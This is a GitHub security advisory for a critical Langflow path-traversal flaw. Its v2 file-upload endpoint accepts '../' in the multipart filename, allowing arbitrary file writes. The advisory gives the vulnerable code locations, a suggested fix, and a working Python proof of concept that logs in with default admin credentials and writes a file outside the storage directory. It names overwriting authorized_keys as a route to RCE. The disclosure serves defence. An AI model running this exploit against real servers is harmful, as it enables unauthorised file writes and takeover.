# [C] Langflow has an Arbitrary File Write (RCE) via v2 API

## Summary
Severity: Critical
Advisory: GHSA-g2j9-7rj2-gm6c
CVE: CVE-2026-33309
CWE: CWE-22, CWE-284, CWE-73, CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-g2j9-7rj2-gm6c
Type: github-advisory

## Affected
- PyPI: `langflow` — affected >=1.2.0 <1.9.0

## Details
### Summary

While reviewing the recent patch for **CVE-2025-68478** (External Control of File Name in v1.7.1), I discovered that the root architectural issue within `LocalStorageService` remains unresolved. Because the underlying storage layer lacks boundary containment checks, the system relies entirely on the HTTP-layer `ValidatedFileName` dependency.

This defense-in-depth failure leaves the `POST /api/v2/files/` endpoint vulnerable to Arbitrary File Write. The multipart upload filename bypasses the path-parameter guard, allowing authenticated attackers to write files anywhere on the host system, leading to Remote Code Execution (RCE).

### Details
The vulnerability exists in two layers:

1. **API Layer (`src/backend/base/langflow/api/v2/files.py:162`)**: Inside the `upload_user_file` route, the `filename` is extracted directly from the multipart `Content-Disposition` header (`new_filename = file.filename`). It is passed verbatim to the storage service. `ValidatedFileName` provides zero protection here as it only guards URL path parameters.
2. **Storage Layer (`src/backend/base/langflow/services/storage/local.py:114-116`)**: The `LocalStorageService` uses naive path concatenation (`file_path = folder_path / file_name`). It lacks a `resolve().is_relative_to(base_dir)` containment check.

**Recommended Fix:**

1. Sanitize the multipart filename before processing:

```python
from pathlib import Path as StdPath
new_filename = StdPath(file.filename or "").name # Strips directory traversal characters
if not new_filename or ".." in new_filename:
    raise HTTPException(status_code=400, detail="Invalid file name")

```

2. Add a canonical path containment check inside `LocalStorageService.save_file` to permanently kill this vulnerability class.

### PoC
This Python script verifies the vulnerability against `langflowai/langflow:latest` (v1.7.3) by writing a file outside the user's UUID storage directory.

```python
import requests

BASE_URL = "http://localhost:7860"
# Authenticate to get a valid JWT
token = requests.post(f"{BASE_URL}/api/v1/login", data={"username": "admin", "password": "admin"}).json()["access_token"]

# Payload using directory traversal in the multipart filename
TRAVERSAL_FILENAME = "../../traversal_proof.txt"
SENTINEL_CONTENT = b"CVE_RESEARCH_SENTINEL_KEY"

resp = requests.post(
    f"{BASE_URL}/api/v2/files/",
    headers={"Authorization": f"Bearer {token}"},
    files={"file": (TRAVERSAL_FILENAME, SENTINEL_CONTENT, "text/plain")},
)

print(f"Status: {resp.status_code}") # Returns 201
# The file is successfully written to `/app/data/.cache/langflow/traversal_proof.txt`

```

Server Logs:
```
2026-02-19T10:04:54.031888Z [info     ] File ../traversal_proof.txt saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.
2026-02-19T10:05:51.792520Z [info     ] File secret_image.png saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.
```
Docker cntainer file:
```
user@40416f6848f2:~/.cache/langflow$ ls
3668bcce-db6c-4f58-834c-f49ba0024fcb  profile_pictures	secret_key  traversal_proof.txt
```

### Impact
Authenticated Arbitrary File Write. An attacker can overwrite critical system files, inject malicious Python components, or overwrite `.ssh/authorized_keys` to achieve full Remote Code Execution on the host server.

## References
- https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c
- https://nvd.nist.gov/vuln/detail/CVE-2026-33309
- https://github.com/langflow-ai/langflow
- https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-79.yaml
